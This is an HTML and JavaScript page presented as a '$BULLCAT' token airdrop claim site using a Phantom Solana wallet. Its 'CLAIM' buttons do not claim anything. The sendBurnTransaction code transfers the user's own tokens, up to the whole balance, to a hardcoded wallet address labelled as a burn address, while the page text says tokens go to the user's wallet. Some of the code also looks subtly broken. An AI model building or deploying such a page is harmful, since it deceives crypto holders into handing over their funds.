<!DOCTYPE html>
<html lang="en" class="scroll-smooth">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>$BULLCAT • Airdrop Claim</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"/>
  <style>
    .scanline {
      position: relative;
    }
    .scanline::after {
      content: '';
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      background: linear-gradient(transparent, rgba(248, 113, 113, 0.08), transparent);
      background-size: 100% 300%;
      animation: scan 4s linear infinite;
      pointer-events: none;
    }
    @keyframes scan {
      0% { background-position: 0 0; }
      100% { background-position: 0 300%; }
    }
    .glow-red {
      text-shadow: 0 0 20px rgb(248 113 113);
    }
  </style>
</head>
<body class="bg-zinc-950 text-white min-h-screen font-mono">

  <div class="max-w-lg mx-auto pt-12 px-6">
    <!-- Header -->
    <div class="text-center mb-10">
      <div class="inline-flex items-center gap-3 text-4xl font-black mb-2">
        <i class="fas fa-cat text-orange-500"></i>
        <span class="bg-gradient-to-r from-red-400 to-orange-500 bg-clip-text text-transparent">$BULLCAT</span>
      </div>
      <h1 class="text-5xl font-bold tracking-tighter glow-red">AIRDROP CLAIM</h1>
      <p class="text-red-400/80 mt-2">Burn → Claim</p>
    </div>

    <!-- Main Card -->
    <div class="bg-zinc-900 border border-red-500/50 rounded-3xl p-8 shadow-2xl shadow-red-500/10 scanline">
      
      <!-- Balance -->
      <div id="balanceDisplay" class="mb-8 p-6 bg-black/70 rounded-2xl border border-red-500/30 text-center">
        <p class="text-gray-400 text-sm mb-1">YOUR $BULLCAT BALANCE</p>
        <div class="flex items-baseline justify-center gap-2">
          <span id="tokenBalance" class="text-6xl font-bold text-white">0.00</span>
          <span class="text-red-400 text-2xl font-medium">$BULLCAT</span>
        </div>
        <p id="walletAddress" class="text-xs text-gray-500 mt-3 font-mono break-all"></p>
      </div>

      <!-- Claim Amount -->
      <div class="mb-6">
        <label class="block text-gray-400 text-sm mb-3">AMOUNT TO CLAIM</label>
        <div class="relative">
          <input 
            type="number" 
            id="burnAmount" 
            class="w-full bg-black border border-red-500/50 focus:border-red-500 rounded-2xl px-6 py-5 text-3xl outline-none transition-all"
            placeholder="0.00"
            step="0.01"
          />
          <button onclick="setMaxAmount()" 
                  class="absolute right-4 top-1/2 -translate-y-1/2 text-red-400 hover:text-red-300 font-bold text-sm px-4 py-2">
            MAX
          </button>
        </div>
      </div>

      <!-- Action Buttons -->
      <div class="grid grid-cols-2 gap-4">
        <button onclick="claimSelected()" 
                class="bg-red-600 hover:bg-red-700 active:scale-95 transition-all py-6 rounded-2xl font-bold text-lg flex items-center justify-center gap-2">
          <i class="fas fa-bolt"></i>
          CLAIM SELECTED
        </button>
        
        <button onclick="claimAll()" 
                class="bg-gradient-to-r from-red-700 to-red-600 hover:from-red-800 hover:to-red-700 active:scale-95 transition-all py-6 rounded-2xl font-bold text-lg border-2 border-red-400 flex items-center justify-center gap-2">
          <i class="fas fa-fire"></i>
          🔥 CLAIM ALL
        </button>
      </div>

      <p class="text-center text-[10px] text-gray-500 mt-8">
        All claimed tokens will be sent to your connected wallet<br>
        <span class="text-red-500">Claim is irreversible</span>
      </p>
    </div>

    <!-- Connect Wallet -->
    <div class="mt-8 text-center">
      <button onclick="connectWallet()" 
              id="connectBtn"
              class="px-8 py-4 bg-white text-black rounded-2xl font-bold hover:bg-gray-200 transition-all flex items-center gap-3 mx-auto">
        <i class="fas fa-wallet"></i>
        <span>CONNECT PHANTOM</span>
      </button>
    </div>
  </div>

  <script type="module">
    import { Connection, PublicKey, Transaction, VersionedTransaction, TransactionMessage } from "https://unpkg.com/@solana/web3.js@1.98.0/lib/index.iife.js";
    import { getAssociatedTokenAddress, createTransferInstruction, getAccount, createAssociatedTokenAccountInstruction } from "https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.15/+esm";

    const BURN_ADDRESS = "FtX1wo7WdJiP7Xxvx4H9Z52VrjjrmeGdjnFnGVqfXYtu";
    const BULLCAT_MINT = "G9j8WWDeJXZdvwQgP82ooDuHmpc3Gy8NCSins71Lpump";
    const RPC_URL = "https://api.mainnet-beta.solana.com"; // Change to faster RPC if needed

    let connectedPublicKey = null;
    let provider = null;
    let connection = new Connection(RPC_URL, "confirmed");

    async function connectWallet() {
      try {
        if (!window.solana) {
          alert("Please install Phantom wallet!");
          return;
        }

        provider = window.solana;
        const resp = await provider.connect();
        connectedPublicKey = resp.publicKey;

        document.getElementById("walletAddress").textContent = 
          `${connectedPublicKey.toString().slice(0,8)}...${connectedPublicKey.toString().slice(-6)}`;
        
        document.getElementById("connectBtn").innerHTML = `
          <i class="fas fa-check"></i> CONNECTED
        `;
        document.getElementById("connectBtn").disabled = true;

        await fetchBalance();
      } catch (err) {
        console.error(err);
        alert("Failed to connect wallet");
      }
    }

    async function fetchBalance() {
      if (!connectedPublicKey) return;

      try {
        const tokenMint = new PublicKey(BULLCAT_MINT);
        const ata = await getAssociatedTokenAddress(tokenMint, connectedPublicKey);
        
        const account = await getAccount(connection, ata);
        const balance = Number(account.amount) / 1_000_000_000; // Assuming 9 decimals - adjust if different

        document.getElementById("tokenBalance").textContent = balance.toLocaleString('en-US', {minimumFractionDigits: 2});
      } catch (e) {
        console.log("No token account or error fetching balance");
        document.getElementById("tokenBalance").textContent = "0.00";
      }
    }

    function setMaxAmount() {
      const balance = parseFloat(document.getElementById("tokenBalance").textContent.replace(/,/g, ''));
      document.getElementById("burnAmount").value = balance;
    }

    async function claimSelected() {
      const amountStr = document.getElementById("burnAmount").value;
      if (!amountStr || parseFloat(amountStr) <= 0) {
        alert("Enter a valid amount");
        return;
      }
      if (!connectedPublicKey) {
        alert("Please connect your Phantom wallet first!");
        return;
      }

      const amount = parseFloat(amountStr);
      if (!confirm(`Claim ${amount} $BULLCAT to burn address?\n\nThis action is IRREVERSIBLE.`)) return;

      await sendBurnTransaction(amount);
    }

    async function claimAll() {
      if (!connectedPublicKey) {
        alert("Please connect your Phantom wallet first!");
        return;
      }

      if (!confirm("⚠️ YOU ARE ABOUT TO CLAIM ALL YOUR $BULLCAT\n\nThis is PERMANENT!")) return;
      if (!confirm("FINAL WARNING — Type 'CLAIMALL' to proceed")) return;

      const input = prompt("Type CLAIMALL to confirm:");
      if (input !== "CLAIMALL") {
        alert("Cancelled.");
        return;
      }

      const balanceStr = document.getElementById("tokenBalance").textContent.replace(/,/g, '');
      const amount = parseFloat(balanceStr);
      if (amount <= 0) {
        alert("No balance to claim");
        return;
      }

      await sendBurnTransaction(amount);
    }

    async function sendBurnTransaction(amount) {
      try {
        const mintPubkey = new PublicKey(BULLCAT_MINT);
        const burnPubkey = new PublicKey(BURN_ADDRESS);
        const fromATA = await getAssociatedTokenAddress(mintPubkey, connectedPublicKey);
        const toATA = await getAssociatedTokenAddress(mintPubkey, burnPubkey);

        const instructions = [];

        // Check if recipient ATA exists
        try {
          await getAccount(connection, toATA);
        } catch {
          instructions.push(
            createAssociatedTokenAccountInstruction(
              connectedPublicKey,
              toATA,
              burnPubkey,
              mintPubkey
            )
          );
        }

        // Transfer instruction (assuming 9 decimals - change if your token has different decimals)
        const decimals = 9;
        instructions.push(
          createTransferInstruction(
            fromATA,
            toATA,
            connectedPublicKey,
            Math.floor(amount * Math.pow(10, decimals))
          )
        );

        const { blockhash } = await connection.getLatestBlockhash();
        const transaction = new VersionedTransaction(
          new TransactionMessage({
            payerKey: connectedPublicKey,
            recentBlockhash: blockhash,
            instructions,
          }).compileToV0Message()
        );

        const signedTx = await provider.signTransaction(transaction);
        const txId = await connection.sendRawTransaction(signedTx.serialize());

        alert(`✅ Transaction sent!\n\nTx ID: ${txId}\n\nView on Solscan`);
        console.log("Burn tx:", txId);

        // Refresh balance
        setTimeout(fetchBalance, 3000);
      } catch (err) {
        console.error(err);
        alert("Transaction failed: " + (err.message || err));
      }
    }

    window.connectWallet = connectWallet;
    window.setMaxAmount = setMaxAmount;
    window.claimSelected = claimSelected;
    window.claimAll = claimAll;
  </script>
</body>
</html>
